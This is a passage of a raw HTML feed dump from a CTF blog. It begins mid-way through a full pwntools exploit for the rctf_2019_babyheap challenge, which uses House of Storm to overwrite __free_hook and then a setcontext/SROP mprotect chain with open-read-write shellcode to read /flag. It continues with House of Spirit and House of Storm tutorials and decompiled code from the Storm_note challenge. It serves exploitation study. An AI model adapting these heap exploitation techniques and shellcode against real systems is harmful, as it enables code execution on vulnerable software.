class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh = remote("node4.buuoj.cn", 29278)</span><br>sh = process(<span class="hljs-string">'./rctf_2019_babyheap'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>elf = ELF(<span class="hljs-string">"./rctf_2019_babyheap"</span>)<br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><br><span class="hljs-comment">#命令简写化</span><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(delim, data)<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims   :sh.recvuntil(delims)<br>itr     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg=<span class="hljs-keyword">lambda</span> address,data:log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>ru(<span class="hljs-string">"Choice: \n"</span>)<br>sl(<span class="hljs-string">'1'</span>)<br>ru(<span class="hljs-string">"Size: "</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>ru(<span class="hljs-string">"Choice: \n"</span>)<br>sl(<span class="hljs-string">'3'</span>)<br>ru(<span class="hljs-string">"Index: "</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>ru(<span class="hljs-string">"Choice: \n"</span>)<br>sl(<span class="hljs-string">'4'</span>)<br>ru(<span class="hljs-string">"Index: "</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>ru(<span class="hljs-string">"Choice: \n"</span>)<br>sl(<span class="hljs-string">'2'</span>)<br>ru(<span class="hljs-string">"Index: "</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">"Content: "</span>)<br>s(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br> <br>add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#3</span><br><br><span class="hljs-comment">#dbg()</span><br><br>free(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x100</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#0</span><br>show(<span class="hljs-number">1</span>)<br>malloc_hook = u64(ru(<span class="hljs-string">'\x7f'</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x58</span> - <span class="hljs-number">0x10</span><br>libc.address = malloc_hook - libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>system = libc.sym[<span class="hljs-string">'system'</span>]<br>free_hook = libc.sym[<span class="hljs-string">'__free_hook'</span>]<br>set_context = libc.symbols[<span class="hljs-string">'setcontext'</span>]<br>lg(<span class="hljs-string">'libc_base'</span>,libc.address)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x160</span>)<span class="hljs-comment">#2</span><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x508</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#10</span><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br>edit(<span class="hljs-number">5</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>))<br><br><span class="hljs-comment">#dbg()</span><br><br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x4d8</span>)<span class="hljs-comment">#11</span><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x4e8</span>)<span class="hljs-comment">#6</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>))<br>free(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#8</span><br>add(<span class="hljs-number">0x4d8</span>)<span class="hljs-comment">#12</span><br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#8</span><br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><br><span class="hljs-comment">#dbg()</span><br><br>free(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x4e8</span>)<span class="hljs-comment">#6</span><br><br><span class="hljs-comment">#dbg()</span><br><br>free(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#--------------修改他们的满足条件进行 house of strom------------------------------#</span><br>storage = free_hook<br>fake_chunk = storage - <span class="hljs-number">0x20</span><br>payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">11</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br>payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) +p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">12</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br>add(<span class="hljs-number">0x48</span>)<span class="hljs-comment">#6</span><br><br><span class="hljs-comment">#dbg()</span><br><br>new_addr =  free_hook &amp;<span class="hljs-number">0xFFFFFFFFFFFFF000</span><br>shellcode1 = <span class="hljs-string">'''</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">mov rsi,%d</span><br><span class="hljs-string">mov edx,0x1000</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">'''</span> % new_addr<br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(set_context+<span class="hljs-number">53</span>)+p64(free_hook+<span class="hljs-number">0x18</span>)*<span class="hljs-number">2</span>+asm(shellcode1))<br><br><span class="hljs-comment">#dbg()</span><br><br>frame = SigreturnFrame()<br>frame.rsp = free_hook+<span class="hljs-number">0x10</span><br>frame.rdi = new_addr<br>frame.rsi = <span class="hljs-number">0x1000</span><br>frame.rdx = <span class="hljs-number">7</span><br>frame.rip = libc.sym[<span class="hljs-string">'mprotect'</span>]<br>edit(<span class="hljs-number">12</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">12</span>)<br><span class="hljs-comment">#dbg() </span><br><br>shellcode2 = <span class="hljs-string">'''</span><br><span class="hljs-string">mov rax, 0x67616c662f ;// /flag</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rsp ;// /flag</span><br><span class="hljs-string">mov rsi, 0 ;// O_RDONLY</span><br><span class="hljs-string">xor rdx, rdx ;</span><br><span class="hljs-string">mov rax, 2 ;// SYS_open</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, rax ;// fd </span><br><span class="hljs-string">mov rsi,rsp  ;</span><br><span class="hljs-string">mov rdx, 1024 ;// nbytes</span><br><span class="hljs-string">mov rax,0 ;// SYS_read</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 1 ;// fd </span><br><span class="hljs-string">mov rsi, rsp ;// buf</span><br><span class="hljs-string">mov rdx, rax ;// count </span><br><span class="hljs-string">mov rax, 1 ;// SYS_write</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rdi, 0 ;// error_code</span><br><span class="hljs-string">mov rax, 60</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">'''</span><br>sl(asm(shellcode2))<br><br><br>dbg()<br>itr()<br> <br> <br>pwn()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，&lt;br&gt;若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。&lt;/strong&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Spirit/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Spirit/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:39.687Z</updated>
    
    <content type="html"><![CDATA[<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><figure class="highlight irpf90"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs irpf90">fake chunk 的 ISMMAP 位不能为 <span class="hljs-number">1</span>，因为 <span class="hljs-keyword">free</span> 时，如果是 mmap 的 chunk，会单独处理。<br>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK<br>fake chunk 的 <span class="hljs-built_in">size</span> 大小需要满足对应的 fastbin 的需求，同时也得对齐。<br>fake chunk 的 next chunk 的大小不能小于 <span class="hljs-number">2</span> * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 <span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span> 的情况。<br></code></pre></td></tr></tbody></table></figure><p>想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。&lt;/p&gt;
&lt;p&gt;要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即&lt;/</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Storm</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Storm/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Storm/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:41.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h2><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，<br>  这两个chunk需要在归位之后处于同一个largebin的index中，<br>  且unsortedbin中的chunk要比largebin中的大<br><span class="hljs-number">2</span>.需要unsorted_bin中的<span class="hljs-keyword">bk指针可控</span><br><span class="hljs-keyword"></span><span class="hljs-number">3</span>.需要largebin中的<span class="hljs-keyword">bk指针和bk_nextsize指针可控</span><br><span class="hljs-keyword"></span><span class="hljs-number">4</span>.glibc版本小于<span class="hljs-number">2</span>.<span class="hljs-number">30</span>,因为<span class="hljs-number">2</span>.<span class="hljs-number">30</span>之后加入了检查<br></code></pre></td></tr></tbody></table></figure><h3 id="largebin中size与index的对应关系"><a href="#largebin中size与index的对应关系" class="headerlink" title="largebin中size与index的对应关系"></a>largebin中size与index的对应关系</h3><figure class="highlight dns"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs dns">size    index<br>[<span class="hljs-number">0</span>x400 , <span class="hljs-number">0</span>x440)    <span class="hljs-number">64</span><br>[<span class="hljs-number">0</span>x440 , <span class="hljs-number">0</span>x480)     <span class="hljs-number">65</span><br>[<span class="hljs-number">0</span>x480 , <span class="hljs-number">0</span>x4C0)    <span class="hljs-number">66</span><br>[<span class="hljs-number">0</span>x4C0 , <span class="hljs-number">0</span>x500)    <span class="hljs-number">67</span><br>[<span class="hljs-number">0</span>x500 , <span class="hljs-number">0</span>x540)    <span class="hljs-number">68</span><br>等差 <span class="hljs-number">0</span>x40    …<br>[<span class="hljs-number">0</span>xC00 , <span class="hljs-number">0</span>xC40)     <span class="hljs-number">96</span><br>[<span class="hljs-number">0</span>xC40 , <span class="hljs-number">0</span>xE00)      <span class="hljs-number">97</span><br>[<span class="hljs-number">0</span>xE00 , <span class="hljs-number">0</span>x1000)     <span class="hljs-number">98</span><br>[<span class="hljs-number">0</span>x1000 , <span class="hljs-number">0</span>x1200)    <span class="hljs-number">99</span><br>[<span class="hljs-number">0</span>x1200 , <span class="hljs-number">0</span>x1400)    <span class="hljs-number">100</span><br>[<span class="hljs-number">0</span>x1400 , <span class="hljs-number">0</span>x1600)    <span class="hljs-number">101</span><br>等差 <span class="hljs-number">0</span>x200    …<br>[<span class="hljs-number">0</span>x2800 , <span class="hljs-number">0</span>x2A00)    <span class="hljs-number">111</span><br>[<span class="hljs-number">0</span>x2A00 , <span class="hljs-number">0</span>x3000)    <span class="hljs-number">112</span><br>[<span class="hljs-number">0</span>x3000 , <span class="hljs-number">0</span>x4000)    <span class="hljs-number">113</span><br>[<span class="hljs-number">0</span>x4000 , <span class="hljs-number">0</span>x5000)    <span class="hljs-number">114</span><br>等差 <span class="hljs-number">0</span>x1000    …<br>[<span class="hljs-number">0</span>x9000 , <span class="hljs-number">0</span>xA000)      <span class="hljs-number">119</span><br>[<span class="hljs-number">0</span>xA000 , <span class="hljs-number">0x10000</span>)     <span class="hljs-number">120</span><br>[<span class="hljs-number">0x10000</span> , <span class="hljs-number">0x18000</span>)    <span class="hljs-number">121</span><br>[<span class="hljs-number">0x18000</span> , <span class="hljs-number">0x20000</span>)    <span class="hljs-number">122</span><br>[<span class="hljs-number">0x20000</span> , <span class="hljs-number">0x28000</span>)    <span class="hljs-number">123</span><br>[<span class="hljs-number">0x28000</span> , <span class="hljs-number">0x40000</span>)    <span class="hljs-number">124</span><br>[<span class="hljs-number">0x40000</span> , <span class="hljs-number">0x80000</span>)    <span class="hljs-number">125</span><br>[<span class="hljs-number">0x80000</span> , …. )        <span class="hljs-number">126</span><br></code></pre></td></tr></tbody></table></figure><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>.将unsorted_bin中的bk指针改为fake_chunk<br><span class="hljs-number">2</span>.largebin中的bk指针改为fake_chunk<span class="hljs-number">+8</span>，bk_nextsize指针改为fake_chunk<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-number">-5</span><span class="hljs-punctuation">,</span><br>（<span class="hljs-keyword">target</span>为要修改的目标地址，fake_chunk为<span class="hljs-keyword">target</span><span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span>）<br> 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize <span class="hljs-operator">=</span> victim（即fake_chunk<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><span class="hljs-number">-5</span><span class="hljs-operator">=</span>victim）<br><span class="hljs-number">3</span>.再次<span class="hljs-keyword">malloc</span>获得<span class="hljs-keyword">target</span>地址处的chunk，可修改<span class="hljs-keyword">target</span>地址处的值<br></code></pre></td></tr></tbody></table></figure><p>House_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。<br>之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. victim 为 <span class="hljs-number">0</span><br><span class="hljs-attribute">2</span>. IS_MMAPPED 为 <span class="hljs-number">1</span><br><span class="hljs-attribute">3</span>. NON_MAIN_ARENA 为 <span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>0x56（二进制数为0101 0110）满足条件<br>0x55（二进制数为0101 0101）不满足条件<br>但是由于程序有随机化，多运行几次总能有一次成功的。</p><figure class="highlight xl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>fd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>bk = fake_chunk<br><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>fd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>bk = fake_chunk+<span class="hljs-number">8</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>fd_nextsize = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">large_bin</span>-&gt;</span>bk_nextsize = fake_chunk - <span class="hljs-number">0</span>x18 -<span class="hljs-number">5</span><br></code></pre></td></tr></tbody></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2019-西湖论剑-Storm-note"><a href="#2019-西湖论剑-Storm-note" class="headerlink" title="2019 西湖论剑 Storm_note"></a>2019 西湖论剑 Storm_note<img src="https://img-blog.csdnimg.cn/7c6fe5147ccf463e93da3ca872c3ad58.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></h3><p>保护全开，实现四个功能，增改删退，ida查看伪代码<br>init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，<br>之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数</p><h4 id="init-proc-函数"><a href="#init-proc-函数" class="headerlink" title="init_proc()函数"></a>init_proc()函数</h4><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ssize_t init_proc()<br>{<br>  ssize_t result; <span class="hljs-regexp">//</span> rax<br>  int fd; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">4</span>h]<br><br>  setbuf(stdin, <span class="hljs-number">0</span>LL);<br>  setbuf(stdout, <span class="hljs-number">0</span>LL);<br>  setbuf(stderr, <span class="hljs-number">0</span>LL);<br>  <span class="hljs-keyword">if</span> ( !mallopt(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>) )                         <span class="hljs-regexp">//</span> mallopt(M_MXFAST,<span class="hljs-number">0</span>)将global_max_fast设置为<span class="hljs-number">0</span>,<br>                                                <span class="hljs-regexp">//</span> 这个值的意思是最大为多大的chunk归fastbin管理,<br>                                                <span class="hljs-regexp">//</span> 设置为<span class="hljs-number">0</span>表示这个程序中不再存在fastbin。<br>                                                <span class="hljs-regexp">//</span> 即本程序禁用了fastbin。<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">if</span> ( mmap(<span class="hljs-number">0</span>xABCD0000LL, <span class="hljs-number">0</span>x1000uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>LL) != <span class="hljs-number">0</span>xABCD0000LL )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  fd = open(<span class="hljs-string">"/dev/urandom"</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  result = read(fd, <span class="hljs-number">0</span>xABCD0100LL, <span class="hljs-number">0</span>x30uLL);<br>  <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">48</span> )<br>    <span class="hljs-keyword">exit</span>(-<span class="hljs-number">1</span>);<br>  return result;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p>calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">alloc_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span> &amp;&amp; note[i]; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">16</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"full!"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size ?"</span>);<br>    _isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;size);<br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span> &amp;&amp; size &lt;= <span class="hljs-number">0xFFFFF</span> )<br>    {<br>      note[i] = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);             <span class="hljs-comment">// calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</span><br>                                                <span class="hljs-comment">// </span><br>      note_size[i] = size;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done"</span>);<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid size"</span>);<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p>存在off-by-null</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit_note</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] 